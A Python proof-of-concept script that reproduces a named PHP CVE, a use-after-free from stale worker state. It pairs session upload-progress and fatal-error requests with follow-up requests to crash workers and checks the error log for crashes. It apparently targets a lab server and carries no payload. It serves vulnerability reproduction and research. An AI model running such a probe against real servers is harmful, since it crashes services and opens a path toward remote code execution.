#!/usr/bin/env python3
"""stale_state_probe.py — CVE-2026-109619 (RCE via stale global state).

Implements the producer/consumer pattern from GHSA-6wmf-4rv5-p3rp: a producer
request stores request-owned state in a worker global (fatal-error backtrace,
session upload-progress data), the request dies without resetting it, and a
consumer request handled by the SAME worker reads the stale (freed) state
before RINIT replaces it. Pre-patch this is a heap UAF; in the lab it shows up
as worker segfaults/abort correlated with the consumer request.

Pairs (producer -> consumer), both sent back-to-back and repeated:
  progress-fatal  session.upload_progress producer + fatal-error consumer
  fatal-info      fatal backtrace producer + plain request consumer

Usage:
  python3 stale_state_probe.py http://127.0.0.1:8080/ --pairs 100
"""

from __future__ import annotations

import argparse
import http.cookiejar
import urllib.parse
import urllib.request

import common


def session_opener():
    cj = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))


def producer_progress(opener, base: str, seq: int) -> None:
    """Upload progress entries: request-owned session state written during
    multipart parsing (runs BEFORE normal request init on later reads)."""
    boundary = f"ss{seq}"
    parts = [
        ("PHP_SESSION_UPLOAD_PROGRESS", None, f"probe{seq}".encode()),
        ("file", f"f{seq}.bin", b"A" * 4096),
    ]
    body = common.multipart(parts, boundary=boundary)
    common.opener_post(opener, base + "/?action=upload", body,
                       f"multipart/form-data; boundary={boundary}")


def producer_fatal(opener, base: str, seq: int) -> None:
    """Fatal error with backtraces on: stores request-owned error state that
    pre-patch shutdown fails to reset."""
    common.opener_post(opener, base + "/?action=fatal", b"", None)


def consumer_plain(opener, base: str, seq: int = 0) -> tuple[int, bytes, str]:
    return common.opener_get(opener, base + "/?action=info")


PAIRS = {
    "progress-fatal": (producer_progress, producer_fatal, consumer_plain),
    "fatal-info": (producer_fatal, consumer_plain, consumer_plain),
}


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("base")
    ap.add_argument("--pairs", type=int, default=100)
    ap.add_argument("--pairing", default="progress-fatal", choices=sorted(PAIRS))
    ap.add_argument("--timeout", type=float, default=15.0)
    args = ap.parse_args()
    base = args.base.rstrip("/")

    prod1, prod2, consume = PAIRS[args.pairing]
    baseline = common.baseline_error_log()
    crashes_seen = 0
    resets = 0

    for seq in range(args.pairs):
        opener = session_opener()
        common.opener_get(opener, base + "/?action=info")  # warm + get session cookie
        prod1(opener, base, seq)
        prod2(opener, base, seq)
        # consumer burst on the same connection pool — same worker likely on
        # prefork with few servers
        for _ in range(3):
            status, _body, err = consume(opener, base)
            if status == 0 and "timed out" not in err and "Timeout" not in err:
                resets += 1
        crashes = common.new_crash_lines(baseline)
        if crashes:
            crashes_seen += len(crashes)
            baseline = common.baseline_error_log()
            common.eprint(f"  [{seq}] worker crash after pair {seq}:")
            for ln in crashes[:5]:
                common.eprint("    " + ln.rstrip())

    print(f"done: pairs={args.pairs} resets={resets} crash_lines={crashes_seen}")
    if crashes_seen:
        print("[+] worker deaths correlated with consumer requests — stale-state "
              "symptom reproduced (see error log).")
        return 0
    print("[-] no crash correlation observed; raise --pairs or try --pairing fatal-info.")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
